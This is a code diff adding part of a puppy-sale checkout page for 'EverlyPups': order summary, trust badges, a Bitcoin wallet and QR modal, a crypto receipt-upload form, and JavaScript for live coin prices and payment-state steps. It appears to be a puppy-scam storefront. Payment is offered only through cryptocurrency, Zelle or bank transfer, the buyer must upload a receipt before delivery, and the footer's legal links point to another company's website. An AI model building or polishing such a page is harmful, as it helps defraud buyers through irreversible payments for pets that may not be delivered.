+              <span id="summaryDetailLocation" style="color: #4A5568; font-weight: 500; text-align: left; line-height: 1.4;">-</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 0.8rem; font-family: 'Inter', sans-serif;">
+              <span style="color: var(--text-muted); font-weight: 500;">Payment</span>
+              <span id="summaryDetailPayment" style="color: #1E293B; font-weight: 600;">Not selected</span>
+            </div>
+          </div>
+
+          <hr class="summary-divider" />
+
+          <div class="summary-inclusions-box">
+            <div class="inclusions-title">Included at No Extra Cost</div>
+            <ul class="inclusions-list">
+              <li><i class="fa-solid fa-circle-check inclusion-check"></i> Free Nationwide Delivery</li>
+              <li><i class="fa-solid fa-circle-check inclusion-check"></i> 10-Year Health Commitment & Guarantee</li>
+              <li><i class="fa-solid fa-circle-check inclusion-check"></i> Complete Nose-to-Tail Veterinary Health Record</li>
+              <li><i class="fa-solid fa-circle-check inclusion-check"></i> Microchipped for Lifetime Safety</li>
+              <li><i class="fa-solid fa-circle-check inclusion-check"></i> Up-to-date Vaccinations & Deworming</li>
+              <li><i class="fa-solid fa-circle-check inclusion-check"></i> Starter Kit, mom scent blanket, food, and toy</li>
+            </ul>
+          </div>
+
+          <hr class="summary-divider" />
+
+          <div class="summary-total-row">
+            <span class="total-label">Total Due</span>
+            <span class="total-val" id="pricingTotal">$2,497.00</span>
+          </div>
+        </div>
+      </aside>
+
+      <!-- 2.6 TRUST INFORMATION -->
+      <section class="trust-info">
+        <div class="subtle-trust-row">
+          <div class="subtle-trust-item">
+            <i class="fa-solid fa-shield-halved trust-mini-icon"></i>
+            <div class="trust-mini-text">
+              <span class="trust-mini-title">Secure Payment Process</span>
+              <span class="trust-mini-desc">Encrypted private channels</span>
+            </div>
+          </div>
+          <div class="subtle-trust-item">
+            <i class="fa-solid fa-file-shield trust-mini-icon"></i>
+            <div class="trust-mini-text">
+              <span class="trust-mini-title">Verified Adoption</span>
+              <span class="trust-mini-desc">Contract and vet registry</span>
+            </div>
+          </div>
+          <div class="subtle-trust-item">
+            <i class="fa-solid fa-truck-ramp-box trust-mini-icon"></i>
+            <div class="trust-mini-text">
+              <span class="trust-mini-title">Confirmation Before Delivery</span>
+              <span class="trust-mini-desc">Cleared receipt verification</span>
+            </div>
+          </div>
+          <div class="subtle-trust-item">
+            <i class="fa-solid fa-envelope-circle-check trust-mini-icon"></i>
+            <div class="trust-mini-text">
+              <span class="trust-mini-title">Support Available by Email</span>
+              <span class="trust-mini-desc">Dedicated care helpline</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </main>
+
+  <!-- ==========================================================================
+       3. QR Code Centered Popup Modal
+       ========================================================================== -->
+  <div class="modal-overlay" id="qrModal" onclick="handleOverlayClick(event)">
+    <div class="modal-content" onclick="event.stopPropagation()">
+      <div class="modal-header">
+        <span class="modal-title" id="modalTitle">Pay with Bitcoin</span>
+        <button class="modal-close-icon" onclick="closeQrModal()">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="modal-usd-amount" id="modalUsdAmount">$2,497.00 USD</div>
+        
+        <div class="modal-crypto-row">
+          <span class="modal-crypto-lbl" id="modalCryptoLabel">Bitcoin Amount:</span>
+          <span class="modal-crypto-val" id="modalCryptoAmount">0.0416 BTC</span>
+        </div>
+        
+        <div class="modal-crypto-row">
+          <span class="modal-crypto-lbl">Network:</span>
+          <span class="modal-crypto-val" id="modalNetwork">Bitcoin Network</span>
+        </div>
+
+        <div class="modal-qr-container">
+          <div class="large-qr-mockup">
+            <img src="" id="modalQrImg" alt="QR Code" style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px; display: none;" />
+            <i class="fa-solid fa-qrcode modal-qr-icon" id="modalQrPlaceholder"></i>
+          </div>
+        </div>
+
+        <div class="modal-address-section">
+          <span class="modal-address-lbl">Wallet Address</span>
+          <div class="modal-address-box">
+            <span class="modal-address-text" id="modalAddressText">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
+            <button class="btn-modal-copy" onclick="copyModalAddress()" title="Copy Address">
+              <i class="fa-regular fa-copy"></i>
+            </button>
+          </div>
+        </div>
+
+        <p class="modal-instruction">Scan the QR code or copy the wallet address to complete your payment.</p>
+        
+        <div class="modal-warning">
+          <i class="fa-solid fa-triangle-exclamation"></i>
+          <span>Make sure you send the payment using the selected network. Payments sent through the wrong network may not be recoverable.</span>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-secondary-action" onclick="closeQrModal()">Close</button>
+        <button class="btn-primary-action" onclick="submitCryptoSentFromModal()">I've Made the Payment</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==========================================================================
+       4. Submit Crypto Payment Modal
+       ========================================================================== -->
+  <div class="modal-overlay" id="submitReceiptModal" style="display: none;" onclick="handleReceiptModalOverlayClick(event)">
+    <div class="modal-content" onclick="event.stopPropagation()">
+      <div class="modal-header">
+        <span class="modal-title" style="font-family: 'Nunito', sans-serif !important; font-size: 1.1rem !important; font-weight: 800 !important; color: #0F172A !important;">Submit Crypto Payment</span>
+        <button class="modal-close-icon" onclick="closeReceiptModal()">&times;</button>
+      </div>
+      <div class="modal-body" style="text-align: left !important; padding: 1.25rem 1.5rem !important;">
+        <p class="modal-supporting-text-left" style="font-family: 'Inter', sans-serif !important; font-size: 0.825rem !important; color: var(--text-muted) !important; margin: 0 0 1rem 0 !important; line-height: 1.4 !important;">
+          Upload your payment receipt so our team can verify your cryptocurrency payment.
+        </p>
+
+        <!-- Payment details read-only box -->
+        <div class="receipt-preview-box" style="background-color: #F8FAFC !important; border: 1px solid #E2E8F0 !important; border-radius: 8px !important; padding: 0.85rem 1rem !important; margin-bottom: 1rem !important; box-sizing: border-box !important;">
+          <div class="receipt-preview-row" style="display: flex !important; justify-content: space-between !important; font-size: 0.85rem !important; margin-bottom: 0.5rem !important; font-family: 'Inter', sans-serif !important;">
+            <span style="color: #64748B !important; font-weight: 500 !important;">Payment Method</span>
+            <span style="color: #1E293B !important; font-weight: 700 !important;">Cryptocurrency</span>
+          </div>
+          <div class="receipt-preview-row" style="display: flex !important; justify-content: space-between !important; font-size: 0.85rem !important; margin-bottom: 0.5rem !important; font-family: 'Inter', sans-serif !important;">
+            <span style="color: #64748B !important; font-weight: 500 !important;">Token</span>
+            <span style="color: #1E293B !important; font-weight: 700 !important;" id="receiptModalToken">Bitcoin (BTC)</span>
+          </div>
+          <div class="receipt-preview-row" style="display: flex !important; justify-content: space-between !important; font-size: 0.85rem !important; margin-bottom: 0.5rem !important; font-family: 'Inter', sans-serif !important;">
+            <span style="color: #64748B !important; font-weight: 500 !important;">Network</span>
+            <span style="color: #1E293B !important; font-weight: 700 !important;" id="receiptModalNetwork">Bitcoin Network</span>
+          </div>
+          <div class="receipt-preview-row" style="display: flex !important; justify-content: space-between !important; font-size: 0.85rem !important; font-family: 'Inter', sans-serif !important;">
+            <span style="color: #64748B !important; font-weight: 500 !important;">Amount</span>
+            <span style="color: var(--brand-primary) !important; font-weight: 800 !important;" id="receiptModalAmount">$2,497.00</span>
+          </div>
+        </div>
+
+        <!-- Transaction Hash Field -->
+        <div class="form-group" style="margin-bottom: 1rem !important; text-align: left !important;">
+          <label class="crypto-select-label" style="display: block !important; font-family: 'Inter', sans-serif !important; font-size: 0.75rem !important; font-weight: 700 !important; color: #475569 !important; margin-bottom: 0.35rem !important; text-transform: uppercase !important; letter-spacing: 0.05em !important;">Transaction Hash (TXhash)</label>
+          <div class="input-wrapper" style="height: 42px !important; border: 1px solid #CBD5E1 !important; border-radius: 8px !important; padding: 0 0.75rem !important; box-sizing: border-box !important;">
+            <input type="text" id="txIdInput" placeholder="Enter Transaction Hash (TXhash)" style="width: 100% !important; border: none !important; outline: none !important; font-family: 'Inter', sans-serif !important; font-size: 0.85rem !important; color: #1E293B !important; background: transparent !important;" />
+          </div>
+          <span style="font-family: 'Inter', sans-serif !important; font-size: 0.7rem !important; color: var(--text-muted) !important; display: block !important; margin-top: 0.25rem !important;">Providing your Transaction Hash (TXhash) helps us verify your payment faster.</span>
+        </div>
+
+        <!-- Upload Field -->
+        <div class="form-group" style="margin-bottom: 1rem !important; text-align: left !important;">
+          <label class="crypto-select-label" style="display: block !important; font-family: 'Inter', sans-serif !important; font-size: 0.75rem !important; font-weight: 700 !important; color: #475569 !important; margin-bottom: 0.35rem !important; text-transform: uppercase !important; letter-spacing: 0.05em !important;">Upload Payment Receipt</label>
+          <span style="font-family: 'Inter', sans-serif !important; font-size: 0.75rem !important; color: var(--text-muted) !important; display: block !important; margin-bottom: 0.5rem !important; line-height: 1.3 !important;">Upload a screenshot or PDF showing your completed cryptocurrency payment.</span>
+          
+          <!-- Drag-and-drop zone -->
+          <div class="drag-drop-area" id="dragDropArea">
+            <input type="file" id="receiptFileInput" accept=".jpg,.jpeg,.png,.pdf" style="display: none !important;" onchange="handleFileSelect(event)" />
+            <i class="fa-solid fa-cloud-arrow-up" style="font-size: 1.5rem !important; color: var(--brand-primary) !important; margin-bottom: 0.5rem !important; display: block !important;"></i>
+            <span style="font-family: 'Inter', sans-serif !important; font-size: 0.8rem !important; font-weight: 700 !important; color: #475569 !important; display: block !important; margin-bottom: 0.2rem !important;">Upload Receipt</span>
+            <span style="font-family: 'Inter', sans-serif !important; font-size: 0.7rem !important; color: #94A3B8 !important; display: block !important;">or drag and drop file here</span>
+          </div>
+
+          <!-- File details preview box -->
+          <div id="filePreviewBox" style="display: none; align-items: center; justify-content: space-between; border: 1px solid #E2E8F0; border-radius: 8px; padding: 0.6rem 0.85rem; margin-top: 0.75rem; background-color: #F8FAFC; box-sizing: border-box;">
+            <div style="display: flex; align-items: center; gap: 0.5rem; overflow: hidden; margin-right: 0.5rem;">
+              <i class="fa-regular fa-file-pdf" id="fileTypeIcon" style="font-size: 1.15rem; color: #EF4444; flex-shrink: 0;"></i>
+              <div style="display: flex; flex-direction: column; overflow: hidden;">
+                <span id="fileNameText" style="font-family: 'Inter', sans-serif; font-size: 0.8rem; font-weight: 600; color: #1E293B; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">receipt.pdf</span>
+                <span id="fileSizeText" style="font-family: 'Inter', sans-serif; font-size: 0.7rem; color: #94A3B8;">1.2 MB</span>
+              </div>
+            </div>
+            <button class="btn-remove-file" onclick="removeUploadedFile(event)" style="background: none; border: none; color: #EF4444; cursor: pointer; padding: 0.25rem; font-size: 0.95rem;" title="Remove File">
+              <i class="fa-regular fa-trash-can"></i>
+            </button>
+          </div>
+          
+          <div style="display: flex; justify-content: space-between; margin-top: 0.4rem; font-family: 'Inter', sans-serif; font-size: 0.7rem; color: #94A3B8;">
+            <span>Accepted formats: JPG, PNG, PDF</span>
+            <span>Maximum file size: 10 MB</span>
+          </div>
+
+          <!-- Validation Error Alert -->
+          <div id="receiptValidationError" style="display: none; align-items: center; gap: 0.4rem; background-color: #FFF5F5; border: 1px solid #FEE2E2; border-radius: 6px; padding: 0.5rem 0.75rem; margin-top: 0.75rem; box-sizing: border-box;">
+            <i class="fa-solid fa-circle-exclamation" style="color: #EF4444; font-size: 0.85rem;"></i>
+            <span id="receiptErrorMsg" style="font-family: 'Inter', sans-serif; font-size: 0.75rem; color: #B91C1C; font-weight: 500;">Please upload your payment receipt before submitting.</span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-secondary-action" onclick="closeReceiptModal()">Cancel</button>
+        <button class="btn-primary-action" style="width: auto !important; padding: 0 1.5rem !important;" onclick="submitReceiptForVerification()">Submit for Verification</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==========================================================================
+       5. Footer Section
+       ========================================================================== -->
+  <footer class="checkout-footer">
+    <div class="checkout-footer-container">
+      <div class="checkout-footer-top">
+        <ul class="footer-links-list">
+          <li class="copyright">© 2026 EverlyPups</li>
+          <li><a href="https://www.puppyspot.com/terms-of-use" target="_blank">Terms of Use</a></li>
+          <li>•</li>
+          <li><a href="https://www.puppyspot.com/privacy" target="_blank">Privacy Policy</a></li>
+          <li>•</li>
+          <li><a href="https://www.puppyspot.com/sitemap" target="_blank">Sitemap</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ==========================================================================
+       5. Interactive JS Script Controller
+       ========================================================================== -->
+  <script src="data/siteData.js?v=1715"></script>
+  <script>
+    let activePuppy = null;
+    let selectedMethod = 'crypto';
+    let currentCryptoState = 'awaiting'; // awaiting, verification, confirmed
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Find selected puppy in SITE_DATA
+      const urlParams = new URLSearchParams(window.location.search);
+      const puppyIdStr = urlParams.get('id');
+      
+      if (puppyIdStr && typeof SITE_DATA !== 'undefined' && SITE_DATA.puppies) {
+        activePuppy = SITE_DATA.puppies.find(p => String(p.id) === String(puppyIdStr));
+      }
+
+      // Default fallback details in case ID is missing (Matches Caleb American Shepadoodle)
+      if (!activePuppy) {
+        activePuppy = {
+          name: "Caleb",
+          breed: "American Shepadoodle",
+          gender: "Male",
+          age: "8 weeks",
+          id: 823648,
+          price: 2497,
+          image: "images/puppies/american-shepadoodle/caleb-link-823648-504981041.jpg"
+        };
+      }
+
+      if (activePuppy) {
+        const priceFormatted = "$" + activePuppy.price.toLocaleString() + ".00";
+        const usdCryptoFormatted = "$" + activePuppy.price.toLocaleString() + ".00 USD";
+        
+        // Populate Sticky Summary Card
+        document.getElementById('summaryPuppyPhoto').src = activePuppy.image;
+        document.getElementById('summaryPuppyPhoto').alt = activePuppy.name;
+        document.getElementById('summaryPuppyName').textContent = activePuppy.name;
+        document.getElementById('summaryPuppyBreed').textContent = activePuppy.breed;
+        document.getElementById('summaryPuppySpecs').textContent = activePuppy.gender + ' • ' + activePuppy.age;
+        document.getElementById('summaryPuppyPrice').textContent = priceFormatted;
+        document.getElementById('pricingTotal').textContent = priceFormatted;
+
+        // Populate Amounts
+        document.getElementById('cryptoAmountUsd').textContent = usdCryptoFormatted;
+        document.getElementById('zelleAmountUsd').textContent = priceFormatted;
+        document.getElementById('bankAmountUsd').textContent = priceFormatted;
+        document.getElementById('modalUsdAmount').textContent = usdCryptoFormatted;
+      }
+
+      // Setup custom dropdown select listener
+      setupCustomSelect('coinSelectorTrigger', 'coinSelectorDropdown', 'selectedCoin', (val) => {
+        populateCoinDetails(val);
+      });
+
+      // Run initial population of BTC details (fallback default)
+      populateCoinDetails('BTC');
+
+      // Fetch live prices from CoinGecko to override fallbacks
+      fetchLivePrices();
+      
+      // Start the live price refresh countdown timer
+      startRateTimer();
+
+      // Dynamic Back link to Delivery step
+      const backLink = document.getElementById('btnBackToDelivery');
+      if (backLink && activePuppy) {
+        backLink.href = 'delivery.html?id=' + activePuppy.id;
+      }
+
+      // Load saved delivery details into order summary
+      loadSavedDeliverySummary();
+    });
+
+    function loadSavedDeliverySummary() {
+      const savedDelivery = localStorage.getItem('everlypups_checkout_delivery');
+      
+      const summaryDetailPuppyName = document.getElementById('summaryDetailPuppyName');
+      const summaryDetailBreed = document.getElementById('summaryDetailBreed');
+      const summaryDetailDelivery = document.getElementById('summaryDetailDelivery');
+      const summaryDetailLocationRow = document.getElementById('summaryDetailLocationRow');
+      const summaryDetailLocation = document.getElementById('summaryDetailLocation');
+      const summaryDetailPayment = document.getElementById('summaryDetailPayment');
+
+      if (activePuppy) {
+        if (summaryDetailPuppyName) summaryDetailPuppyName.textContent = activePuppy.name;
+        if (summaryDetailBreed) summaryDetailBreed.textContent = activePuppy.breed;
+      }
+
+      if (savedDelivery) {
+        try {
+          const data = JSON.parse(savedDelivery);
+            let label = "";
+            if (data.deliveryOption === 'pickup') label = 'Pickup';
+            else if (data.deliveryOption === 'local') label = 'Local Delivery';
+            else if (data.deliveryOption === 'nationwide') label = 'Nationwide Delivery';
+            else if (data.deliveryOption === 'doorstep') label = 'Doorstep Delivery';
+            if (summaryDetailDelivery) summaryDetailDelivery.textContent = label;
+          if (data.locationText) {
+            if (summaryDetailLocationRow) summaryDetailLocationRow.style.display = 'flex';
+            if (summaryDetailLocation) summaryDetailLocation.textContent = data.locationText;
+          } else {
+            if (summaryDetailLocationRow) summaryDetailLocationRow.style.display = 'none';
+          }
+        } catch (e) {
+          console.error("Error parsing saved delivery data for summary", e);
+        }
+      }
+      
+      // Initial selectPaymentMethod sets the payment method
+      if (typeof selectedMethod !== 'undefined' && selectedMethod) {
+        let methodLabel = "";
+        if (selectedMethod === 'crypto') methodLabel = 'Cryptocurrency';
+        else if (selectedMethod === 'zelle') methodLabel = 'Zelle Transfer';
+        else if (selectedMethod === 'bank') methodLabel = 'Bank Transfer';
+        if (summaryDetailPayment) summaryDetailPayment.textContent = methodLabel;
+      }
+    }
+
+    let rateCountdown = 30;
+    let rateInterval = null;
+
+    function startRateTimer() {
+      if (rateInterval) clearInterval(rateInterval);
+      rateCountdown = 30;
+      
+      const timerSpan = document.getElementById('rateTimer');
+      const timerIcon = document.getElementById('rateTimerIcon');
+      if (timerSpan) timerSpan.textContent = rateCountdown;
+      if (timerIcon) timerIcon.classList.remove('fa-spin');
+
+      rateInterval = setInterval(() => {
+        rateCountdown--;
+        if (timerSpan) timerSpan.textContent = rateCountdown;
+
+        if (rateCountdown <= 0) {
+          if (timerIcon) timerIcon.classList.add('fa-spin');
+          fetchLivePrices();
+        }
+      }, 1000);
+    }
+
+    function triggerManualRateRefresh(e) {
+      if (e) e.preventDefault();
+      
+      const timerIcon = document.getElementById('rateTimerIcon');
+      if (timerIcon) timerIcon.classList.add('fa-spin');
+      
+      fetchLivePrices();
+    }
+
+    async function fetchLivePrices() {
+      try {
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether,usd-coin&vs_currencies=usd');
+        if (!response.ok) throw new Error('API fetch failed');
+        const data = await response.json();
+        
+        if (data.bitcoin && data.bitcoin.usd) updateTokenRate('BTC', data.bitcoin.usd);
+        if (data.ethereum && data.ethereum.usd) updateTokenRate('ETH', data.ethereum.usd);
+        if (data.solana && data.solana.usd) updateTokenRate('SOL', data.solana.usd);
+        if (data.tether && data.tether.usd) updateTokenRate('USDT', data.tether.usd);
+        if (data['usd-coin'] && data['usd-coin'].usd) updateTokenRate('USDC', data['usd-coin'].usd);
+        
+        // Recalculate details for the currently active coin trigger
+        const currentCoin = document.getElementById('selectedCoin').value;
+        populateCoinDetails(currentCoin);
+
+        // Reset and restart rate countdown timer on success
+        startRateTimer();
+      } catch (err) {
+        console.warn('Failed to fetch live prices from CoinGecko, using fallback static rates:', err);
+        const timerIcon = document.getElementById('rateTimerIcon');
+        if (timerIcon) timerIcon.classList.remove('fa-spin');
+      }
+    }
+
+    function updateTokenRate(coinCode, rate) {
+      const option = document.querySelector(`.custom-select-option[data-value="${coinCode}"]`);
+      if (option && rate) {
+        option.setAttribute('data-rate', rate);
+      }
+    }
+
+    // Custom drop down trigger helper
+    function setupCustomSelect(triggerId, dropdownId, hiddenInputId, onSelectCallback) {
+      const trigger = document.getElementById(triggerId);
+      const dropdown = document.getElementById(dropdownId);
+      const hiddenInput = document.getElementById(hiddenInputId);
+      const container = trigger.closest('.custom-select-container');
+      const inputWrapper = trigger.closest('.input-wrapper');
+
+      trigger.addEventListener('click', (e) => {
+        e.stopPropagation();
+        
+        // Close other custom dropdowns
+        document.querySelectorAll('.custom-select-dropdown').forEach(d => {
+          if (d !== dropdown) {
+            d.style.display = 'none';
+            const c = d.closest('.custom-select-container');
+            const w = d.closest('.input-wrapper');
+            if (c) c.classList.remove('open');
+            if (w) w.classList.remove('open');
+          }
+        });
+
+        const isOpen = dropdown.style.display === 'block';
+        dropdown.style.display = isOpen ? 'none' : 'block';
+        container.classList.toggle('open', !isOpen);
+        if (inputWrapper) {
+          inputWrapper.classList.toggle('open', !isOpen);
+        }
+      });
+
+      dropdown.addEventListener('click', (e) => {
+        const option = e.target.closest('.custom-select-option');
+        if (!option) return;
+
+        const val = option.getAttribute('data-value');
+        const text = option.textContent;
+
+        hiddenInput.value = val;
+        
+        const placeholderSpan = trigger.querySelector('.custom-select-placeholder');
+        placeholderSpan.textContent = text;
+        placeholderSpan.classList.add('selected-val');
+
+        dropdown.querySelectorAll('.custom-select-option').forEach(o => o.classList.remove('selected'));
+        option.classList.add('selected');
+
+        dropdown.style.display = 'none';
+        container.classList.remove('open');
+        if (inputWrapper) {
+          inputWrapper.classList.remove('open');
+        }
+
+        if (typeof onSelectCallback === 'function') {
+          onSelectCallback(val);
+        }
+      });
+    }
+
+    // Toggle dropdown details inside Crypto selector
+    function populateCoinDetails(coinCode) {
+      const addressLabel = document.getElementById('cryptoAddress');
+      const networkLabel = document.getElementById('cryptoNetwork');
+      const cryptoAmountLabel = document.getElementById('cryptoAmountCrypto');
+      
+      const option = document.querySelector(`.custom-select-option[data-value="${coinCode}"]`);
+      if (option && activePuppy) {
+        const address = option.getAttribute('data-address');
+        const network = option.getAttribute('data-network');
+        const rate = parseFloat(option.getAttribute('data-rate'));
+        const symbol = option.getAttribute('data-symbol');
+        
+        // Calculate crypto amount
+        const cryptoVal = activePuppy.price / rate;
+        let formattedCrypto = "";
+        if (symbol === 'BTC') {
+          formattedCrypto = cryptoVal.toFixed(4) + " BTC";
+        } else if (symbol === 'ETH') {
+          formattedCrypto = cryptoVal.toFixed(3) + " ETH";
+        } else if (symbol === 'SOL') {
+          formattedCrypto = cryptoVal.toFixed(2) + " SOL";
+        } else {
+          formattedCrypto = cryptoVal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " " + symbol;
+        }
+
+        // Update labels
+        addressLabel.textContent = address;
+        networkLabel.textContent = network;
+        cryptoAmountLabel.textContent = formattedCrypto;
+
+        // Also update modal variables
+        document.getElementById('modalTitle').textContent = "Pay with " + option.textContent.split(' ')[0];
+        document.getElementById('modalCryptoLabel').textContent = option.textContent.split(' ')[0] + " Amount:";
+        document.getElementById('modalCryptoAmount').textContent = formattedCrypto;
+        document.getElementById('modalNetwork').textContent = network;
+        document.getElementById('modalAddressText').textContent = address;
+
+        // Update modal QR code source dynamically
+        const modalQrImg = document.getElementById('modalQrImg');
+        const modalQrPlaceholder = document.getElementById('modalQrPlaceholder');
+        if (modalQrImg && modalQrPlaceholder) {
+          const customQr = option.getAttribute('data-qr');
+          if (customQr) {
+            modalQrImg.src = customQr;
+          } else {
+            modalQrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(address)}`;
+          }
+          modalQrImg.style.display = 'block';
+          modalQrPlaceholder.style.display = 'none';
+        }
+      }
+    }
+
+    // Modal view handlers
+    function openQrModal() {
+      document.getElementById('qrModal').classList.add('open');
+      document.body.style.overflow = 'hidden'; // Stop page scrolling under modal
+    }
+
+    function closeQrModal() {
+      document.getElementById('qrModal').classList.remove('open');
+      document.body.style.overflow = '';
+    }
+
+    function handleOverlayClick(e) {
+      if (e.target.id === 'qrModal') {
+        closeQrModal();
+      }
+    }
+
+    // Copy to clipboard actions
+    function copyWalletAddress() {
+      const addressText = document.getElementById('cryptoAddress').textContent;
+      performCopyAction(addressText, '.crypto-action-btn:first-child');
+    }
+
+    function copyModalAddress() {
+      const addressText = document.getElementById('modalAddressText').textContent;
+      performCopyAction(addressText, '.btn-modal-copy');
+    }
+
+    function performCopyAction(text, selector) {
+      navigator.clipboard.writeText(text).then(() => {
+        const copyBtn = document.querySelector(selector);
+        const originalHTML = copyBtn.innerHTML;
+        
+        if (selector === '.btn-modal-copy') {
+          copyBtn.innerHTML = '<i class="fa-solid fa-check" style="color: #219653;"></i>';
+        } else {
+          copyBtn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
+          copyBtn.style.color = '#219653';
+          copyBtn.style.borderColor = '#A7F3D0';
+        }
+        
+        setTimeout(() => {
+          copyBtn.innerHTML = originalHTML;
+          copyBtn.style.color = '';
+          copyBtn.style.borderColor = '';
+        }, 2000);
+      }).catch(err => {
+        console.error('Could not copy text: ', err);
+      });
+    }
+
+    // Toggle Active Selector Cards & Content Blocks
+    function selectPaymentMethod(method) {
+      selectedMethod = method;
+      
+      // Update selector card active styles
+      document.querySelectorAll('.selector-card').forEach(c => c.classList.remove('active'));
+      
+      // Hide active instruction cards
+      document.getElementById('activeCrypto').style.display = 'none';
+      document.getElementById('activeZelle').style.display = 'none';
+      document.getElementById('activeBank').style.display = 'none';
+
+      if (method === 'crypto') {
+        document.getElementById('cardCryptoSelector').classList.add('active');
+        document.getElementById('activeCrypto').style.display = 'block';
+        
+        // Restore current state of crypto checkout
+        setCryptoState(currentCryptoState);
+        
+        // Restart price rate update timer
+        startRateTimer();
+      } else if (method === 'zelle') {
+        document.getElementById('cardZelleSelector').classList.add('active');
+        document.getElementById('activeZelle').style.display = 'block';
+        
+        // Stepper resets to awaiting payment
+        resetStepperToAwaiting();
+        
+        // Stop timer updates to save network
+        if (rateInterval) clearInterval(rateInterval);
+      } else if (method === 'bank') {
+        document.getElementById('cardBankSelector').classList.add('active');
+        document.getElementById('activeBank').style.display = 'block';
+        
+        // Stepper resets to awaiting payment
+        resetStepperToAwaiting();
+        
+        // Stop timer updates to save network
+        if (rateInterval) clearInterval(rateInterval);
+      }
+
+      // Update Payment label in summary
+      const paymentVal = document.getElementById('summaryDetailPayment');
+      if (paymentVal) {
+        if (method === 'crypto') {
+          paymentVal.textContent = 'Cryptocurrency';
+        } else if (method === 'zelle') {
+          paymentVal.textContent = 'Zelle Transfer';
+        } else if (method === 'bank') {
+          paymentVal.textContent = 'Bank Transfer';
+        }
+      }
+    }
+
+    // Stepper updates
+    function resetStepperToAwaiting() {
+      const s3 = document.getElementById('step3');
+      const s4 = document.getElementById('step4');
+      const s5 = document.getElementById('step5');
+      
+      s3.className = "progress-step active";
+      s3.querySelector('.progress-indicator').innerHTML = '●';
+      s4.className = "progress-step";
+      s4.querySelector('.progress-indicator').innerHTML = '○';
+      s5.className = "progress-step";
+      s5.querySelector('.progress-indicator').innerHTML = '○';
+    }
+
+    function setCryptoState(state) {
+      currentCryptoState = state;
+      
+      const awaitingDiv = document.getElementById('cryptoAwaitingState');
+      const verificationDiv = document.getElementById('cryptoVerificationState');
+      const confirmedDiv = document.getElementById('cryptoConfirmedState');
+      const failedDiv = document.getElementById('cryptoFailedState');
+      
+      awaitingDiv.style.display = 'none';
+      verificationDiv.style.display = 'none';
+      confirmedDiv.style.display = 'none';
+      if (failedDiv) failedDiv.style.display = 'none';
+
+      const s3 = document.getElementById('step3'); // Awaiting Payment
+      const s4 = document.getElementById('step4'); // Payment Verification
+      const s5 = document.getElementById('step5'); // Delivery Scheduled
+
+      if (state === 'awaiting') {
+        awaitingDiv.style.display = 'block';
+        
+        s3.className = "progress-step active";
+        s3.querySelector('.progress-indicator').innerHTML = '●';
+        s4.className = "progress-step";
+        s4.querySelector('.progress-indicator').innerHTML = '○';
+        s5.className = "progress-step";
+        s5.querySelector('.progress-indicator').innerHTML = '○';
+      } else if (state === 'verification') {
+        verificationDiv.style.display = 'block';
+        
+        s3.className = "progress-step completed";
+        s3.querySelector('.progress-indicator').innerHTML = '<i class="fa-solid fa-check"></i>';
+        s4.className = "progress-step active";
+        s4.querySelector('.progress-indicator').innerHTML = '●';
+        s5.className = "progress-step";
+        s5.querySelector('.progress-indicator').innerHTML = '○';
+      } else if (state === 'confirmed') {
+        confirmedDiv.style.display = 'block';
+        
+        s3.className = "progress-step completed";
+        s3.querySelector('.progress-indicator').innerHTML = '<i class="fa-solid fa-check"></i>';
+        s4.className = "progress-step completed";
+        s4.querySelector('.progress-indicator').innerHTML = '<i class="fa-solid fa-check"></i>';
+        s5.className = "progress-step active";
+        s5.querySelector('.progress-indicator').innerHTML = '●';
+      } else if (state === 'failed') {
+        if (failedDiv) failedDiv.style.display = 'block';
+        
+        s3.className = "progress-step completed";
+        s3.querySelector('.progress-indicator').innerHTML = '<i class="fa-solid fa-check"></i>';
+        s4.className = "progress-step active";
+        s4.querySelector('.progress-indicator').innerHTML = '✕';
+        s5.className = "progress-step";
+        s5.querySelector('.progress-indicator').innerHTML = '○';
+      }
+    }
+
+    // Submit Action Simulation state machines
+    function submitCryptoSent() {
+      closeQrModal();
+      openReceiptModal();
+    }
+
+    function submitCryptoSentFromModal() {
+      closeQrModal();
+      openReceiptModal();
+    }
+
+    // Modal Receipt Uploader handlers
+    let uploadedFile = null;
+
+    function openReceiptModal() {
+      const option = document.querySelector(`.custom-select-option.selected`);
+      if (option && activePuppy) {
+        document.getElementById('receiptModalToken').textContent = option.textContent;
+        document.getElementById('receiptModalNetwork').textContent = option.getAttribute('data-network');
+        document.getElementById('receiptModalAmount').textContent = "$" + activePuppy.price.toLocaleString() + ".00";
+      }
+
+      document.getElementById('submitReceiptModal').classList.add('open');
+      document.body.style.overflow = 'hidden';
+      
+      initDragDrop();
+    }
+
+    function closeReceiptModal() {
+      document.getElementById('submitReceiptModal').classList.remove('open');
+      document.body.style.overflow = '';
+      
+      // Reset inputs
+      document.getElementById('txIdInput').value = '';
+      removeUploadedFile({ stopPropagation: () => {} });
+    }
+
+    function handleReceiptModalOverlayClick(e) {
+      if (e.target.id === 'submitReceiptModal') {
+        closeReceiptModal();
+      }
+    }
+
+    function initDragDrop() {
+      const dropZone = document.getElementById('dragDropArea');
+      const fileInput = document.getElementById('receiptFileInput');
+      if (!dropZone || !fileInput) return;
+
+      // Click to select
+      dropZone.onclick = () => fileInput.click();
+
+      // Drag behaviors
+      dropZone.ondragover = (e) => {
+        e.preventDefault();
+        dropZone.classList.add('dragover');
+      };
+
+      dropZone.ondragleave = () => {
+        dropZone.classList.remove('dragover');
+      };
+
+      dropZone.ondrop = (e) => {
+        e.preventDefault();
+        dropZone.classList.remove('dragover');
+        if (e.dataTransfer.files.length > 0) {
+          processFile(e.dataTransfer.files[0]);
+        }
+      };
+    }
+
+    function handleFileSelect(e) {
